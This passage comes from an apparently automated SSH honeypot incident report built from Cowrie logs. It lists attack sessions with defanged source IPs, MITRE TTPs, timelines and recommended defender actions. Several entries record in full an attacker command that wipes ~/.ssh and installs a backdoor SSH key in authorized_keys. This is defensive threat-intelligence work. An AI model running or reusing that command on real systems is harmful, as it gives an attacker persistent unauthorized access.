| `2026-04-04 09:25:53` | `cowrie.command.failed` |
| `2026-04-04 09:25:54` | `cowrie.log.closed` |
| `2026-04-04 09:25:54` | `cowrie.session.params` |
| `2026-04-04 09:25:54` | `cowrie.command.input` |
| `2026-04-04 09:25:54` | `cowrie.session.file_download` |
| `2026-04-04 09:25:54` | `cowrie.log.closed` |
| `2026-04-04 09:25:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-158ba0fcf5d8

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 09:25 |
| **Last Seen** | 2026-04-04 09:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:25:56` | `cowrie.session.connect` |
| `2026-04-04 09:25:56` | `cowrie.client.version` |
| `2026-04-04 09:25:56` | `cowrie.client.kex` |
| `2026-04-04 09:25:56` | `cowrie.login.success` |
| `2026-04-04 09:25:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9be0feaecb17

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 09:30 |
| **Last Seen** | 2026-04-04 09:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:30:17` | `cowrie.session.connect` |
| `2026-04-04 09:30:17` | `cowrie.client.version` |
| `2026-04-04 09:30:17` | `cowrie.client.kex` |
| `2026-04-04 09:30:18` | `cowrie.login.success` |
| `2026-04-04 09:30:18` | `cowrie.session.params` |
| `2026-04-04 09:30:18` | `cowrie.command.input` |
| `2026-04-04 09:30:18` | `cowrie.command.failed` |
| `2026-04-04 09:30:18` | `cowrie.log.closed` |
| `2026-04-04 09:30:18` | `cowrie.session.params` |
| `2026-04-04 09:30:18` | `cowrie.command.input` |
| `2026-04-04 09:30:18` | `cowrie.session.file_download` |
| `2026-04-04 09:30:18` | `cowrie.log.closed` |
| `2026-04-04 09:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43e0eb002599

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 09:30 |
| **Last Seen** | 2026-04-04 09:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:30:20` | `cowrie.session.connect` |
| `2026-04-04 09:30:20` | `cowrie.client.version` |
| `2026-04-04 09:30:20` | `cowrie.client.kex` |
| `2026-04-04 09:30:21` | `cowrie.login.success` |
| `2026-04-04 09:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c377b9acd59

| Field | Detail |
|---|---|
| **Source IP** | `60.167.19[.]189` |
| **First Seen** | 2026-04-04 09:33 |
| **Last Seen** | 2026-04-04 09:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:33:10` | `cowrie.session.connect` |
| `2026-04-04 09:33:10` | `cowrie.client.version` |
| `2026-04-04 09:33:10` | `cowrie.client.kex` |
| `2026-04-04 09:33:12` | `cowrie.login.success` |
| `2026-04-04 09:33:13` | `cowrie.direct-tcpip.request` |
| `2026-04-04 09:33:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.167.19[.]189` to AbuseIPDB if not already reported
- [ ] Block `60.167.19[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec7bfee76fee

| Field | Detail |
|---|---|
| **Source IP** | `186.222.55[.]187` |
| **First Seen** | 2026-04-04 09:33 |
| **Last Seen** | 2026-04-04 09:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:33:18` | `cowrie.session.connect` |
| `2026-04-04 09:33:19` | `cowrie.client.version` |
| `2026-04-04 09:33:19` | `cowrie.client.kex` |
| `2026-04-04 09:33:21` | `cowrie.login.success` |
| `2026-04-04 09:33:21` | `cowrie.direct-tcpip.request` |
| `2026-04-04 09:33:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.222.55[.]187` to AbuseIPDB if not already reported
- [ ] Block `186.222.55[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd074b21bbed

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 09:33 |
| **Last Seen** | 2026-04-04 09:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:33:59` | `cowrie.session.connect` |
| `2026-04-04 09:33:59` | `cowrie.client.version` |
| `2026-04-04 09:33:59` | `cowrie.client.kex` |
| `2026-04-04 09:34:00` | `cowrie.login.success` |
| `2026-04-04 09:34:00` | `cowrie.session.params` |
| `2026-04-04 09:34:00` | `cowrie.command.input` |
| `2026-04-04 09:34:00` | `cowrie.command.failed` |
| `2026-04-04 09:34:00` | `cowrie.log.closed` |
| `2026-04-04 09:34:01` | `cowrie.session.params` |
| `2026-04-04 09:34:01` | `cowrie.command.input` |
| `2026-04-04 09:34:01` | `cowrie.session.file_download` |
| `2026-04-04 09:34:01` | `cowrie.log.closed` |
| `2026-04-04 09:34:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2a198db33b3

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 09:34 |
| **Last Seen** | 2026-04-04 09:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:34:03` | `cowrie.session.connect` |
| `2026-04-04 09:34:03` | `cowrie.client.version` |
| `2026-04-04 09:34:03` | `cowrie.client.kex` |
| `2026-04-04 09:34:04` | `cowrie.login.success` |
| `2026-04-04 09:34:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0170010c4e1e

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 09:36 |
| **Last Seen** | 2026-04-04 09:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:36:28` | `cowrie.session.connect` |
| `2026-04-04 09:36:28` | `cowrie.client.version` |
| `2026-04-04 09:36:28` | `cowrie.client.kex` |
| `2026-04-04 09:36:29` | `cowrie.login.success` |
| `2026-04-04 09:36:29` | `cowrie.session.params` |
| `2026-04-04 09:36:29` | `cowrie.command.input` |
| `2026-04-04 09:36:29` | `cowrie.command.failed` |
| `2026-04-04 09:36:29` | `cowrie.log.closed` |
| `2026-04-04 09:36:29` | `cowrie.session.params` |
| `2026-04-04 09:36:29` | `cowrie.command.input` |
| `2026-04-04 09:36:30` | `cowrie.session.file_download` |
| `2026-04-04 09:36:30` | `cowrie.log.closed` |
| `2026-04-04 09:36:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2fbb007b7b8

| Field | Detail |
|---|---|
| **Source IP** | `213.225.8[.]230` |
| **First Seen** | 2026-04-04 09:36 |
| **Last Seen** | 2026-04-04 09:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:36:32` | `cowrie.session.connect` |
| `2026-04-04 09:36:32` | `cowrie.client.version` |
| `2026-04-04 09:36:32` | `cowrie.client.kex` |
| `2026-04-04 09:36:33` | `cowrie.login.success` |
| `2026-04-04 09:36:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.225.8[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.225.8[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d1ae45f46e

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 09:39 |
| **Last Seen** | 2026-04-04 09:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:39:17` | `cowrie.session.connect` |
| `2026-04-04 09:39:17` | `cowrie.client.version` |
| `2026-04-04 09:39:17` | `cowrie.client.kex` |
| `2026-04-04 09:39:18` | `cowrie.login.success` |
| `2026-04-04 09:39:18` | `cowrie.session.params` |
| `2026-04-04 09:39:18` | `cowrie.command.input` |
| `2026-04-04 09:39:18` | `cowrie.command.failed` |
| `2026-04-04 09:39:18` | `cowrie.log.closed` |
| `2026-04-04 09:39:18` | `cowrie.session.params` |
| `2026-04-04 09:39:18` | `cowrie.command.input` |
| `2026-04-04 09:39:19` | `cowrie.session.file_download` |
| `2026-04-04 09:39:19` | `cowrie.log.closed` |
| `2026-04-04 09:39:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69b8dcf070a1

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 09:39 |
| **Last Seen** | 2026-04-04 09:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:39:20` | `cowrie.session.connect` |
| `2026-04-04 09:39:20` | `cowrie.client.version` |
| `2026-04-04 09:39:20` | `cowrie.client.kex` |
| `2026-04-04 09:39:21` | `cowrie.login.success` |
| `2026-04-04 09:39:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-852554b0c960

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 09:41 |
| **Last Seen** | 2026-04-04 09:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:41:29` | `cowrie.session.connect` |
| `2026-04-04 09:41:29` | `cowrie.client.version` |
| `2026-04-04 09:41:29` | `cowrie.client.kex` |
| `2026-04-04 09:41:30` | `cowrie.login.success` |
| `2026-04-04 09:41:30` | `cowrie.session.params` |
| `2026-04-04 09:41:30` | `cowrie.command.input` |
| `2026-04-04 09:41:30` | `cowrie.command.failed` |
| `2026-04-04 09:41:30` | `cowrie.log.closed` |
| `2026-04-04 09:41:30` | `cowrie.session.params` |
| `2026-04-04 09:41:30` | `cowrie.command.input` |
| `2026-04-04 09:41:30` | `cowrie.session.file_download` |
| `2026-04-04 09:41:30` | `cowrie.log.closed` |
| `2026-04-04 09:41:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aaf53b3b26b

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 09:41 |
| **Last Seen** | 2026-04-04 09:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:41:32` | `cowrie.session.connect` |
| `2026-04-04 09:41:32` | `cowrie.client.version` |
| `2026-04-04 09:41:32` | `cowrie.client.kex` |
| `2026-04-04 09:41:33` | `cowrie.login.success` |
| `2026-04-04 09:41:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a741b9a98aa3

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 09:48 |
| **Last Seen** | 2026-04-04 09:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:48:11` | `cowrie.session.connect` |
| `2026-04-04 09:48:11` | `cowrie.client.version` |
| `2026-04-04 09:48:11` | `cowrie.client.kex` |
| `2026-04-04 09:48:12` | `cowrie.login.success` |
| `2026-04-04 09:48:12` | `cowrie.session.params` |
| `2026-04-04 09:48:12` | `cowrie.command.input` |
| `2026-04-04 09:48:12` | `cowrie.command.failed` |
| `2026-04-04 09:48:12` | `cowrie.log.closed` |
| `2026-04-04 09:48:12` | `cowrie.session.params` |
| `2026-04-04 09:48:12` | `cowrie.command.input` |
| `2026-04-04 09:48:12` | `cowrie.session.file_download` |
| `2026-04-04 09:48:12` | `cowrie.log.closed` |
| `2026-04-04 09:48:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b5705d9b317

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 09:48 |
| **Last Seen** | 2026-04-04 09:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:48:14` | `cowrie.session.connect` |
| `2026-04-04 09:48:14` | `cowrie.client.version` |
| `2026-04-04 09:48:14` | `cowrie.client.kex` |
| `2026-04-04 09:48:15` | `cowrie.login.success` |
| `2026-04-04 09:48:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ef0f49d6c9e

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 09:50 |
| **Last Seen** | 2026-04-04 09:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:50:30` | `cowrie.session.connect` |
| `2026-04-04 09:50:30` | `cowrie.client.version` |
| `2026-04-04 09:50:30` | `cowrie.client.kex` |
| `2026-04-04 09:50:31` | `cowrie.login.success` |
| `2026-04-04 09:50:31` | `cowrie.session.params` |
| `2026-04-04 09:50:31` | `cowrie.command.input` |
| `2026-04-04 09:50:31` | `cowrie.command.failed` |
| `2026-04-04 09:50:31` | `cowrie.log.closed` |
| `2026-04-04 09:50:32` | `cowrie.session.params` |
| `2026-04-04 09:50:32` | `cowrie.command.input` |
| `2026-04-04 09:50:32` | `cowrie.session.file_download` |
| `2026-04-04 09:50:32` | `cowrie.log.closed` |
| `2026-04-04 09:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a12cd40284f0

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 09:50 |
| **Last Seen** | 2026-04-04 09:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 09:50:33` | `cowrie.session.connect` |
| `2026-04-04 09:50:33` | `cowrie.client.version` |
| `2026-04-04 09:50:34` | `cowrie.client.kex` |
| `2026-04-04 09:50:34` | `cowrie.login.success` |
| `2026-04-04 09:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]81` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d748d4f0f1a5

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]81` |
| **First Seen** | 2026-04-04 09:52 |
| **Last Seen** | 2026-04-04 09:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
